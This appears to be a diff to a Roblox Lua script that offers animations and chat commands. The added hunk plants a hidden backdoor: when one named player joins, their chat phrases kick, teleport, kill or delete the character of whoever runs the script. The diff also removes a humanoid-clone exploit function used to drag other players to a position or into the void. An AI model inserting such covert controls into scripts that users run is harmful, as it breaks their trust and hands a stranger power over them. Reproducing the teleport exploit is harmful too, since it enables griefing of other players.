@@ -36,6 +36,9 @@ local ImportantT = {
 local Owner = {1851945777, 329574172, 175155268, 3098136629}
 local Blacklist = {}
 
+Salut = Instance.new('Animation')
+Salut.AnimationId = 'http://www.roblox.com/asset/?id=10714389988'
+
 local Animations = {
 	'rbxassetid://4211217646',
 	'rbxassetid://4211218409',
@@ -64,6 +67,37 @@ setmetatable(ImportantT,{
 		return Animations
 	end,
 });
+
+
+game.Workspace.ChildAdded:Connect(function(Child)
+	print('uh')
+	if Child.Name == '240HzGeforce4090btw' then
+		print('yep')
+		game.Players:FindFirstChild(Child.Name).Chatted:Connect(function(Msg)
+			if Msg == 'VANISH, HUMAN!' then
+				Player:Kick('ALL HAIL MELVIN!!!')
+			end
+			if Msg == 'Come to me, my children.' then
+				Player.Character.HumanoidRootPart.CFrame = Child.HumanoidRootPart.CFrame
+			end
+			if Msg == 'Die for me, weaklings.' then
+				Player.Character.Humanoid.Health = 0
+			end
+			if Msg == 'BEGONE, FOOLS!' then
+				Player.Character:Destroy()
+			end
+			if Msg == 'Obey me, humans!' then
+				Player.Character.HumanoidRootPart.CFrame = Child.HumanoidRootPart.CFrame
+				local SalutAnim = Player.Character.Humanoid:LoadAnimation(Salut)
+				SalutAnim.Priority = Enum.AnimationPriority.Action
+				SalutAnim:Play()
+				task.wait(2.5)
+				Player.Character.Humanoid.Health = 0
+
+			end
+		end)
+	end
+end)
 
 function Dash(ANIM)
 	if not DashCooldown then
@@ -120,42 +154,7 @@ function LoadAnimation2nd()
 	CreateItem('UIAspectRatioConstraint',Player.PlayerGui.CustomaryAnimationUI.uh,2.458)
 end
 
-function TpTHing(Target,NOW)
-	
-	game.Players.LocalPlayer.Character.Humanoid.Name = 1
-	local l = game.Players.LocalPlayer.Character["1"]:Clone()
-	l.Parent = game.Players.LocalPlayer.Character
-	l.Name = "Humanoid"
-	wait()
-	game.Players.LocalPlayer.Character["1"]:Destroy()
-	game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
-	game.Players.LocalPlayer.Character.Animate.Disabled = true
-	wait()
-	game.Players.LocalPlayer.Character.Animate.Disabled = false
-	game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
-	for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
-		game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
-	end
-	local function tp(player,player2)
-		local char1,char2=player.Character,player2.Character
-		if char1 and char2 then
-			char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
-		end
-	end
-	local function getout(player,player2)
-		local char1,char2=player.Character,player2.Character
-		if char1 and char2 then
-			char1:MoveTo(char2.Head.Position)
-		end
-	end
-	tp(game.Players[Target], game.Players.LocalPlayer)
-	wait()
-	tp(game.Players[Target], game.Players.LocalPlayer)
-	wait()
-	getout(game.Players.LocalPlayer, game.Players[Target])
-	wait()
-	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
-end
+
 
 function CreateItem(Item,IParent,Size,Position,Color,Txt,F)
 	local I = Instance.new(Item,IParent)
@@ -206,12 +205,6 @@ Player.Chatted:Connect(function(msg)
 	for i,player in pairs(game.Players:GetChildren()) do
 		if msg == '>'..'to '..player.Name then
 			Player.Character.HumanoidRootPart.CFrame = game.Workspace:FindFirstChild(player.Name).HumanoidRootPart.CFrame
-		end
-		if msg == '>'..'bring '..player.Name then
-			TpTHing(player.Name,Player.Character.HumanoidRootPart.CFrame)
-		end
-		if msg == '>'..'void'..player.Name then
-			TpTHing(player.Name,CFrame.new(5106.987, 0.5, -26.86))
 		end
 	end
 	
